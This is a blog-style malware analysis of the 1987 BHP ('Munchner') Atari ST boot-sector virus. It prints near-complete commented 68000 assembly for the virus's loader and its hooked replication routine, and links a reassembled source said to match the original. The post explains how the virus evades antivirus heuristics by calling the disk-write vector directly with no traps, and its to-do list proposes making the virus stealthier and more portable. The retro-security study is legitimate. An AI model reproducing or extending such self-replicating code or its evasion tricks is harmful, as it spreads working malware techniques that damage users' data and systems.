Title: The Bayrische Hacker Post (BHP) Virus - a recipe for stealth replication
Slug: Munchner
Date: 2024-09-08 09:27
Location: San Francisco / US
Category: Atari ST, Virus
Lang: en
Author: shazz
status: published
summary: Short version for index and feeds

## Introduction

While having 6 hours to spend in a plane, let's take the time to describe another virus I studied some weeks ago and that I found really more interesting that I guess people thought. 

This time, this is about the Bayrische Hacker Post (BHP) Virus, also called the Munchner Vire'87 Virus. 

I guess it was underlooked as it doesn't trigger visible and nasty symptoms. It only replicates if the bootsector looks non-executable. So why bother?

But in fact, under the hood, the BHP virus, especially if coded if 1987 as the bootsector header implies and also due to the fact it uses an undocumented TOS version specific memory address (1.0 for the original code, so around 1986-1987), looks to be in fact a well designed replication blueprint with some stealth capabilities. I hope I got your curiosity, let's go deeper.

## High level specs

To summarize and before going into the details, here are the main characteristics of the BHP Virus:

 - **executable bootsector** virus
 - protects itself against overwriting
 - Implements a generation counter.
 - replaces the original **HDV_BPB vector**
 - **stealth bootsector replication** which doesn't use the `FLOPWR` Xbios call. 
 - replicates itself on any floppy drive units only, if the disks is not **write-protected** (using a TOS specific undocumented memory address) and if the existing bootsector doesn't start with a branch instruction (which is a wrong shortcut)


## The details

The "new" feature that for now I did not see in any other virus code is the fact the virus doesn't use the classic `FLOPRD` and `FLOPWR` Xbios calls to read and write back the bootsector. And this is important as most smarter ST antivirus computes a risk score for bootsectors they don't know based on some typical patterns found in viruses. 
And definitively, using `FLOPWR` to write floppy sectors is a good indicator.

### The bootsector branch to bootcode

Most of bootsectors follows the Atari specifications for the boot sector:

```asm
byte:   label:      meaning:                    values:
$00     BRA.S       branch to boot code         00 00
$02     ......      reserved bytes for OEM code .. .. .. .. .. ..
$08     SERIAL      24-bit serial number        .. .. ..
$0B ... $1E         Floppy details
```

But the BHP doesn't exactly. the first 8 bytes are:

```asm
        DC.B    'VIRE 87',0
        BRA.S    START
```

So the branch instruction... is not in the 2 first bytes as defined but in the "reserved bytes for OEM code". 

And I don't know exactly why, I need to check in the TOS disassembled sourcecode, but looks like the TOS is ok with it and discards the 6 initial "non-code" bytes and finally branches to the bootcode.

I guess it was enough to convince early anti-viruses that this bootsector was not executable.

### The Loader

The Bootcode starts at 0x1E, as soon as copied in `DISKBUF` and being executed, it will

 - Hide itself by decreasing the `PHYSTOP` register value of 0x200 bytes, so where it will be copied, at the end of the free RAM.
 - Copy itself to this location, `PHYSTOP` - `0x200`
 - Save the old `hdv_bpb` vector and set a new vector
 - Increment the generation counter (so every replication will now have the generation counter: generation counter in memory + 1)

```asm
BOOTSECTOR_BEGIN                equ START-$1E
BOOTSECTOR_BPS                  equ BOOTSECTOR_BEGIN+$0B

; BOOTSECTOR_BEGIN:
;    # DC.B    'VIRE 87',0
;    # BRA.S    START
;    # ASL.B    #4,D0
;    # ANDI.B    #$0,D2
;    # ANDI.W    #$A0,$FFFFFFF9(A0,D0.W)
;    # BTST    D2,D0
;    # BTST    D4,D0
;    # ANDI.B    #$0,D0

START:
        MOVEA.L   PHYSTOP.W,A1                      ; A1 = PHYSTOP (0x100000 on 1MB ST)
        SUBA.L    #$200,A1                          ; A1 = PHYSTOP - 512 bytes

        MOVEA.L   A1,A2                             ; A2 = A1
        LEA       BOOTSECTOR_BEGIN(PC),A0           ; A0 = bootsector start in DISKBUF
        MOVE.W    #$FF,D0                           ; for d0 = 255 to 0
.copy:
        MOVE.W    (A0)+,(A1)+                       ; copy 512 bytes of bootsector to PHYSTOP - 0x200
        DBF       D0,.copy

        ; save old hdv_bpb vector
        MOVE.L    HDV_BPB.W,HDV_BPB_OLD_VECTOR_ADDR(A2)

        ; increment generation (never read after)
        ADDQ.L    #1,GENERATION_ADDR(A2)               
        
        LEA       HDV_BPB_VECTOR_ADDR(A2),A0        ; A0 = @HDV_BPB_VECTOR
        MOVE.L    A0,HDV_BPB.W                      ; Set new hdv_bpb vector
        RTS

; ----------------------------------------------------------------------------------------------------------
; Variables
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_OLD_VECTOR:
        DC.L       $00FC0FCA
GENERATION:
        DC.L       $00000014        
```

### The HDV_BPB vector

Now that the virus is installed in memory, it will wait any call to BIOS `Getbpb()` which retrieves the `BPB` (Bios Parameter Block) of the floppy disk. So called at pretty any access to the floppy drive.
This vector will:

 - Call the original `hdv_bpb` vector and save the result (`D0`)
 - Get first and only param of `Getbpb(dev)` to identify the drive unit. And continue only if this is < 2, meaning 0 (A:) or 1 (B:) to exclude hard drives.
 - Check the undocumented TOS memory address `_WPLATCH` for the current drive, which contains 2 words for each drive, with 0x0000 if the floppy write-protected mechanical latch is not set, 0x00FF else.
    - Note, in the original code, the TOS address used was `0x9B4` which is the _wplatch entry point ONLY for TOS 1.0. I added *defines* in the source code to adapt the code to other TOS versions. But a least it is a good indicator this virus as coded in the early days.
 - If not protected, it will use the system disk buffer (`DISKBUFP`) to read the latest bootsector read (as `Getbpb(dev)` retrieves the Bios Parameter Block only) and if this buffer is starting with 0x0000 (probably aiming to check if the bootsector *is not* executable, funny as this virus shows this is not a true indicator)
 - Then it will patch itself by duplicating the current floppy disk  BPB prior to its code to "reconstruct" the full bootsector in memory
 - Then compute the word checksum from its reconstructed bootsector and adjust the last word
 - And now this is where the magic happens! To write down to the floppy disk the reconstructed bootsector matching the inserted disk, it will build the Bios `Rwabs( mode, buf, count, recno, dev)` system call input params on stack... and branch (`JSR`) the address located at `HDV_RW (0x476)` which is the default Rwabs vector.
    - So like that, no TRAP calls to Bios or Xbios (and the `HDV_RW`) address could have been better hidden than using an Immediate in `MOVEA.L   HDV_RW.W,A0`
 - Finally the vector will set back the original `GetBpb` result in `D0` and jump back to the return address.

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; when Getpbp( dev ) is called
; Applications installing themselves here should expect parameters to be located on the stack as they would
; be for the actual function call beginning at 4(sp)
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVEA.L   (sp)+,A5                          ; A5 = pop top of stack return address value, and keep it
        MOVEA.L   HDV_BPB_OLD_VECTOR(PC),A0         ; A0 = old hdv_bpb address
        JSR       (A0)                              ; branch to old vector and come back

        MOVE.L    D0,-(sp)                          ; add to stack D0 = address of current BPB struct returned by Getbpb(dev)
                                                    ; that will be used to reset D0 at the end
        MOVE.W    $4(sp),D0                         ; Get first Getbpb parameter: dev
        CMPI.W    #$2,D0                            ; if dev >= 2 , that's not a floppy
        BGE.S     .do_nothing                       ; do nothing

        LEA       WPLATCH.W,A0                      ; wplatch 0000 for rw, 00FF for write protected, word 1: A, word 2: B
        TST.B     0(A0,D0.W)                        ; if 0, not write protected
        BNE.S     .do_nothing
                                                    ; Memory addresses that are used by the floppies on TOS 1.0 US only
                                                    ; $9B0.W*     Retrycnt (Retry count)
                                                    ; $9B2.W*     Write Protect status
                                                    ; $9B4.W*     wplatch / wp floppy write protect latch variable)
                                                    ; $9C6  *     Sector number
                                                    ; $9CC.B*     CDMA (DMA buffer for bad sector list)
                                                    ; $9CD.B*     DMA high
                                                    ; $9CE.B*     DMA mid
                                                    ; $9CF.B*     DMA low
                                                    ; $A06  *     DSB Drive A        

        MOVEA.L   DISKBUFP.W,A0                     ; A0 = floppy buffer
        TST.W     (A0)                              ; test bootsector starts with 0x0000, means non executable?
        BNE.B     .do_nothing

        MOVE.W    #$12,D0                           ; d0 = 18
        ADDA.L    #$B,A0                            ; a0 = DISKBUFP + 11
        LEA.L     BOOTSECTOR_BPS(PC),A1             ; a1 = BOOTSECTOR_BPS
.copy:
        MOVE.B    (A0)+,(A1)+                       ; copy 18 bytes DISKBUFP[11:29] => floppy params from serial to NHID to BOOTSECTOR_BPS
        DBF       D0,.copy                          ; (itself before bootcode)

        CLR.W     D1                                ; clear d1
        MOVE.W    #$FE,D0                           ; for d0 = 254 to 0
        LEA       BOOTSECTOR_BEGIN(PC),A0
.calc_boot_checksum:
        ADD.W     (A0)+,D1                          ; compute word boot checksum
        DBF       D0,.calc_boot_checksum
        MOVE.W    #BOOT_CHK,D0
        SUB.W     D1,D0
        MOVE.W    D0,(A0)                           ; write adjusted checksum to floppy buffer

        MOVE.W    4(sp),-(sp)                       ; move stack
        CLR.W     -(sp)                             ; dev - 0 (A:) 
        MOVEQ     #1,D0                             ; recno = 1
        MOVE.W    D0,-(sp)                          ; count = 1
        PEA       BOOTSECTOR_BEGIN(PC)              ; buf = bootsector
        MOVE.W    D0,-(sp)                          ; mode = 1 (write)
        MOVEA.L   HDV_RW.W,A0
        JSR       (A0)                              ; call LONG Rwabs( word mode, long buf, word count, word recno, word dev )
        ADDQ.L    #8,sp                             ; fix stack of 12 bytes due of RWABS call
        ADDQ.L    #4,sp
.do_nothing:
        MOVE.L    (sp)+,D0                          ; reset BPB structure in D0
        JMP       (A5)                              ; jmp to original return Getbb() return address
```

## Conclusion

That's it! No symptoms triggered or reset vector or anything else, just, from my point of view, an interesting and relatively small (166 bytes) replication template (with a generation counter) an some stealth capabilities:
 - memory overwrite protection
 - no traps
 - no error on write-protected disks which

For now... I did not saw this blueprint reused in other viruses, especially the `rwabs` no-traps trick and the (not portable as is) `_wplatch` check, but I found it quite interesting and smart.

As usual, you can download the full commented, and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html) here: [MUNCHNER.S]({attach}sources/MUNCHNER.S)


## Appendices

### Fun facts

 - In the UVK book, there is an interesting note that "Thought to have been made by the Bayrische Hacker Post. This is a small computer user’s group in Germany that also publishes a small club magazine. In that magazine, the virus was said to be reset-proof, and that it would ‘write through the write-protect notch’ (haha!)", I would love to find the original article! If you have a scanned copy somewhere, please send it to me!
 - You'll notice that in my version the generation_counter is 14, it could means it had spread a least 14 generations!


### Still to do

 - Propose an all-TOS compatible `_wplatch` check 
 - Propose better "is not executable" check than staring with `$0.l`
 - Hide the `Rwabs` register read


## Run the virus!

{% from '/html/macros/emulator.html' import emulator %}
{{ emulator("MUNCHNER") }}